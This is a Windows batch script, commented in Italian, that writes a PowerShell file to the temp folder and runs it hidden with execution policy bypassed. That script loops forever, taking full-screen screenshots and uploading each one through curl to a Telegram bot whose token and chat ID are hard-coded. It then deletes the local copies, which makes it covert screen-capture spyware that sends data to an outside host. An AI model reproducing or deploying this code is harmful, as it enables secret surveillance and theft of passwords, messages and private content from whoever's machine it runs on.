@echo off
:: Batch per screenshot automatici e invio Telegram
:: Bot: 7909916408:AAFTkG0h0HHynabtZGqAXyzkl13TdeIQWhw
:: Chat ID: 5709299213
:: Intervallo: 5 secondi

setlocal enabledelayedexpansion

:: Offuscare il token e il chat ID
set "b=7909916408:AAFTkG0h0HHynabtZGqAXyzkl13TdeIQWhw"
set "c=5709299213"

:: Creare lo script PowerShell
echo $botToken = '%b%' > %temp%\telegram_send.ps1
echo $chatId = '%c%' >> %temp%\telegram_send.ps1
echo $sleepTime = 10 >> %temp%\telegram_send.ps1
echo Add-Type -AssemblyName System.Windows.Forms >> %temp%\telegram_send.ps1
echo Add-Type -AssemblyName System.Drawing >> %temp%\telegram_send.ps1
echo while($true) { >> %temp%\telegram_send.ps1
echo     $screen = [System.Windows.Forms.SystemInformation]::VirtualScreen >> %temp%\telegram_send.ps1
echo     $bitmap = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height) >> %temp%\telegram_send.ps1
echo     $graphics = [System.Drawing.Graphics]::FromImage($bitmap) >> %temp%\telegram_send.ps1
echo     $graphics.CopyFromScreen($screen.X, $screen.Y, 0, 0, $bitmap.Size) >> %temp%\telegram_send.ps1
echo     $file = "$env:temp\screenshot_$(Get-Date -f 'yyyyMMdd_HHmmss').jpg" >> %temp%\telegram_send.ps1
echo     $bitmap.Save($file, [System.Drawing.Imaging.ImageFormat]::Jpeg) >> %temp%\telegram_send.ps1
echo     $bitmap.Dispose() >> %temp%\telegram_send.ps1
echo     $graphics.Dispose() >> %temp%\telegram_send.ps1
echo     curl.exe -s -X POST "https://api.telegram.org/bot$botToken/sendPhoto" ^ -F chat_id=$chatId ^ -F photo=@"$file" >> %temp%\telegram_send.ps1
echo     Remove-Item "$file" -Force >> %temp%\telegram_send.ps1
echo     Start-Sleep -Seconds $sleepTime >> %temp%\telegram_send.ps1
echo } >> %temp%\telegram_send.ps1

:: Eseguire in background senza finestra
start /B /MIN powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File "%temp%\telegram_send.ps1"

exit
